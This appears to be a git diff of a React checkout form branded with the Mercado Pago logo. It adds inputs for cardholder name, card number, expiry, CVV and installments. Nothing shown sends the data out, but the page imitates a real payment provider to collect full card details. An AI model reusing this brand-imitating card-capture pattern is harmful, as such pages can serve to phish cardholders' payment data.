@@ -1,8 +1,46 @@
 import logo from "./img/Mercado-Pago-Logo.png";
+import { useState } from "react";
+import logo2 from "./img/logo.png";
 
 function App() {
+  const [expiryDate, setExpiryDate] = useState("");
+
+  const handleChange = (event) => {
+    const { value } = event.target;
+    let formattedValue = value.replace(/\D/g, ""); // Remover caracteres no numéricos
+    if (formattedValue.length > 2) {
+      formattedValue =
+        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2); // Agregar "/" después de los 2 primeros caracteres
+    }
+    setExpiryDate(formattedValue);
+  };
+
+  const [cardNumber, setCardNumber] = useState("");
+
+  const handleChangeCard = (event) => {
+    const { value } = event.target;
+    const formattedValue = value.replace(/\s/g, ""); // Remover espacios
+
+    let spacedValue = null;
+    if (formattedValue.length > 0) {
+      spacedValue = formattedValue
+        .match(/.{1,4}/g) // Agrupar los números en bloques de 4 caracteres
+        .join(" "); // Agregar un espacio entre cada bloque
+    }
+
+    setCardNumber(spacedValue);
+  };
+
+  const [inputValue, setInputValue] = useState("");
+
+  const handleChangeCode = (event) => {
+    const { value } = event.target;
+    const formattedValue = value.slice(0, 3); // Limitar a 3 caracteres
+    setInputValue(formattedValue);
+  };
+
   return (
-    <div>
+    <div className="mainContainer bg-[#eeeeee]">
       <nav className="border-gray-200 bg-sky-600 dark:bg-gray-800 dark:border-gray-700">
         <div className="flex flex-wrap items-center justify-between mx-auto p-1 lg:p-1 xl:p-1">
           <a
@@ -27,9 +65,9 @@ function App() {
               xmlns="http://www.w3.org/2000/svg"
             >
               <path
-                fill-rule="evenodd"
+                fillRule="evenodd"
                 d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z"
-                clip-rule="evenodd"
+                clipRule="evenodd"
               ></path>
             </svg>
           </button>
@@ -49,25 +87,33 @@ function App() {
       </nav>
       <div className="h-full my-4 lg:my-32 mx-auto max-w-sm lg:max-w-lg p-4 bg-[#ffffff] border border-gray-200 rounded-lg shadow sm:p-6 md:p-8 dark:bg-gray-800 dark:border-gray-700">
         <form className="space-y-6" action="#">
-          <h5 className="text-xl font-medium text-gray-900 dark:text-white">
-            Mercado Pago
-          </h5>
+          <div className="flex items-center">
+            <div className="flex items-center">
+              <h5 className="text-base font-bold leading-[1.35] font-sans text-gray-900 dark:text-white">
+                Completá los datos de tu tarjeta
+              </h5>
+            </div>
+          </div>
           <div>
-            <h1 className="w-12">Email:</h1>
+            <h1 className="w-12 mb-1">Nombre&nbsp;del&nbsp;titular:</h1>
             <input
               type="email"
               name="email"
               id="email"
               className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
-              placeholder="name@company.com"
+              placeholder="Ingresa tu nombre"
               required
             />
           </div>
           <div>
+            <h1 className="w-12 mb-1">Número&nbsp;de&nbsp;tarjeta:</h1>
             <input
               type="text"
               name="cosa"
               id="cosa"
+              value={cardNumber}
+              onChange={handleChangeCard}
+              maxLength={19} // Permitir un máximo de 19 caracteres incluyendo los espacios
               className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
               placeholder="1234 1234 1234 1234"
               required
@@ -75,41 +121,43 @@ function App() {
           </div>
           <div className="flex">
             <div className="mr-2">
+              <h1 className="w-12 mb-1">Vencimiento</h1>
+
               <input
                 type="text"
+                value={expiryDate}
+                onChange={handleChange}
+                maxLength={5} // Limitar a 5 caracteres incluyendo la "/"
                 className="bg-gray-50 border w-full md:w-[200px] border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                 placeholder="MM/YY"
               />
             </div>
             <div>
+              <h1 className="w-12 mb-1">CVV</h1>
               <input
                 type="text"
-                className="bg-gray-50 border ml-4 md:ml-1 sm:ml-0 border-gray-300 text-gray-900 text-sm rounded-lg sm:w-full md:w-[200px] focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
+                value={inputValue}
+                onChange={handleChangeCode}
+                maxLength={3} // Limitar a 3 caracteres
+                className="bg-gray-50 border ml-4 md:ml-1 sm:ml-0 border-gray-300 text-gray-900 text-sm rounded-lg sm:w-[180px] md:w-[105px] lg:w-[233px] focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                 placeholder="***"
               />
             </div>
           </div>
+
           <div>
-            <h1 className="w-12">Nombre&nbsp;en&nbsp;la&nbsp;tarjeta:</h1>
-            <input
-              type="email"
-              name="email"
-              id="email"
+            <h1 className="w-12 mb-1">Cuotas&nbsp;sin&nbsp;interés</h1>
+            <select
+              name="cuotas"
+              id="cuotas"
               className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
-              placeholder="name@company.com"
               required
-            />
-          </div>
-          <div>
-            <h1 className="w-12">Cuotas&nbsp;sin&nbsp;interés</h1>
-            <input
-              type="text"
-              name="cosa"
-              id="cosa"
-              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
-              placeholder="1234 1234 1234 1234"
-              required
-            />
+            >
+              <option value="">Selecciona una opción</option>
+              <option value="3">3 cuotas sin interés</option>
+              <option value="6">6 cuotas sin interés</option>
+              <option value="12">12 cuotas sin interés</option>
+            </select>
           </div>
           <div className="flex items-start">
             <div className="flex items-start">
@@ -123,6 +171,10 @@ function App() {
             </button>{" "}
           </div>
         </form>
+      </div>
+      <div className="additionalContent">
+        {/* Contenido adicional que deseas que aparezca debajo de la lista */}
+        <p>&nbsp;</p>
       </div>
     </div>
   );
